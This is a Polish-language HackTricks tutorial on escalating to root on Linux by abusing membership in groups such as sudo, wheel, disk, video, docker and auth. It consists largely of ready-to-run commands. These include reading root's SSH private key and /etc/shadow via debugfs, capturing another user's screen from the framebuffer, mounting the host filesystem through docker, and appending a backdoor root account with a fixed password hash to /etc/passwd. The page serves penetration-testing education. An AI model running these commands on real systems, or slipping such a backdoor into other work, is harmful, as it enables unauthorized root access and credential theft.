# Interesujące grupy - Eskalacja uprawnień w systemie Linux

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Grupy Sudo/Admin

### **PE - Metoda 1**

**Czasami**, **domyślnie (lub dlatego, że niektóre oprogramowanie tego wymaga)** w pliku **/etc/sudoers** można znaleźć niektóre z tych linii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik należący do grupy sudo lub admin może wykonywać dowolne polecenia jako sudo**.

Jeśli tak jest, aby **stać się użytkownikiem root, wystarczy wykonać**:
```
sudo su
```
### PE - Metoda 2

Znajdź wszystkie binarne pliki suid i sprawdź, czy istnieje plik binarny **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli odkryjesz, że binarny plik **pkexec jest binarnym SUID** i należysz do grupy **sudo** lub **admin**, prawdopodobnie będziesz mógł wykonywać binarne pliki jako sudo za pomocą `pkexec`.\
Dzieje się tak, ponieważ zazwyczaj te grupy są uwzględnione w **polityce polkit**, która określa, które grupy mogą korzystać z `pkexec`. Sprawdź to za pomocą:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Poniżej znajdziesz grupy, które mają uprawnienia do wykonania **pkexec** i które **domyślnie** pojawiają się w niektórych dystrybucjach Linuxa, takich jak grupy **sudo** i **admin**.

Aby **stać się rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Jeśli próbujesz uruchomić **pkexec** i otrzymujesz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś połączony bez GUI**. Istnieje jednak sposób na obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji SSH**:

{% code title="sesja1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="sesja2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Grupa Wheel

**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć tę linię:
```
%wheel	ALL=(ALL:ALL) ALL
```
To oznacza, że **każdy użytkownik należący do grupy wheel może wykonywać dowolne polecenie jako sudo**.

Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
```
sudo su
```
## Grupa Shadow

Użytkownicy z grupy **shadow** mogą **odczytywać** plik **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## Grupa dyskowa

Ten przywilej jest prawie **równoważny dostępowi roota**, ponieważ umożliwia dostęp do wszystkich danych wewnątrz maszyny.

Pliki: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Zauważ, że używając debugfs możesz również **zapisywać pliki**. Na przykład, aby skopiować `/tmp/asd1.txt` do `/tmp/asd2.txt`, możesz wykonać:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Jednakże, jeśli spróbujesz **zapisać pliki należące do roota** (takie jak `/etc/shadow` lub `/etc/passwd`), otrzymasz błąd "**Permission denied**".

## Grupa Video

Za pomocą polecenia `w` możesz sprawdzić **kto jest zalogowany do systemu** i otrzymasz wynik podobny do poniższego:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.

Grupa **video** ma dostęp do wyświetlania obrazu z ekranu. W zasadzie można obserwować ekran. Aby to zrobić, musisz **przechwycić bieżący obraz z ekranu** w postaci surowych danych i uzyskać rozdzielczość, jaką ekran używa. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Aby **otworzyć** **surowy obraz**, można użyć **GIMP**, wybrać plik \*\*`screen.raw` \*\* i wybrać jako typ pliku **Dane surowego obrazu**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Następnie zmodyfikuj szerokość i wysokość na te używane na ekranie oraz sprawdź różne typy obrazów (i wybierz ten, który najlepiej pokazuje ekran):

![](<../../../.gitbook/assets/image (288).png>)

## Grupa Root

Wygląda na to, że domyślnie **członkowie grupy root** mogą mieć dostęp do **modyfikacji** niektórych plików konfiguracyjnych **usług** lub niektórych plików **bibliotek** lub **innych interesujących rzeczy**, które mogą być wykorzystane do eskalacji uprawnień...

**Sprawdź, które pliki mogą być modyfikowane przez członków grupy root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupa Docker

Możesz **zamontować system plików root hosta na woluminie instancji**, więc gdy instancja zostanie uruchomiona, natychmiast wczytuje `chroot` do tego woluminu. To efektywnie daje ci uprawnienia root na maszynie.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
W końcu, jeśli żadne z wcześniejszych sugestii Ci się nie podobają lub nie działają z jakiegoś powodu (firewall api docker?), zawsze możesz spróbować **uruchomić kontener z uprawnieniami roota i uciec z niego**, jak wyjaśniono tutaj:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Jeśli masz uprawnienia do zapisu w gnieździe dockera, przeczytaj [**ten post o eskalacji uprawnień poprzez nadużycie gniazda dockera**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Grupa lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Grupa Adm

Zazwyczaj **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików dziennika** znajdujących się wewnątrz _/var/log/_.\
Dlatego, jeśli skompromitowałeś użytkownika należącego do tej grupy, zdecydowanie powinieneś **sprawdzić dzienniki**.

## Grupa Auth

W systemie OpenBSD grupa **auth** zazwyczaj może zapisywać w folderach _**/etc/skey**_ i _**/var/db/yubikey**_, jeśli są używane.\
Te uprawnienia mogą być nadużyte za pomocą następującego exploitu, aby **przejąć uprawnienia roota**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
